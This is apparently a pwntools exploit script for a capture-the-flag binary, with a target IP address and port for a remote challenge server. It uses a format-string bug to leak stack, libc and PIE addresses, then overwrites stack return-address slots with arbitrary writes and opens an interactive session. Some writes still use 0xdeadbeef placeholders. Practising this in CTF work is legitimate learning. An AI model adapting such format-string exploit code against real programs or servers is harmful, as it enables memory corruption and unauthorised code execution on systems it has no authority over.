from pwn import *
from sys import *

context.clear(arch='amd64')


context.log_level = 'warning'

elf = ELF('./chall')
libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')

p = process('./chall')
HOST = '103.152.242.172'
PORT = 60903

cmd = """
b*0x55555555536c
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)


#b'0x7ffff7dbb0b3\n' 75
#b'0x55555555536e\n' 79 - 0x136e
#0x7fffffffdde8 << ret
#b'0x7fffffffdee0\n' 65

payload = b'%65$p|%75$p|%79$p'
p.sendline(payload)
res = p.recvline().split(b"|")
stack = eval(res[0]) - 0xf8
stack_ret = eval(res[0]) - 0xf8
base_address = eval(res[1]) - 0x270b3
pie = eval(res[2]) - 0x136e
bss = elf.bss()+0x300+pie

def arb(address,tujuan):
	rop = tujuan
	payload = fmtstr_payload(6,{address:rop},write_size='short')
	p.sendline(payload)


for i in range(1):
	arb((stack+(8*2)),p64(0xdeadbeef))
	p.sendline(b"\x00"*0x128)
	sleep(0.05)

for i in range(1):
	arb((stack+8),p64(0xdeadbeef))
	p.sendline(b"\x00"*0x128)
	sleep(0.05)

p.sendline(b"\x00"*0x128)
sleep(1)
arb(stack,p64(0x000000000000101a+pie))

p.interactive()
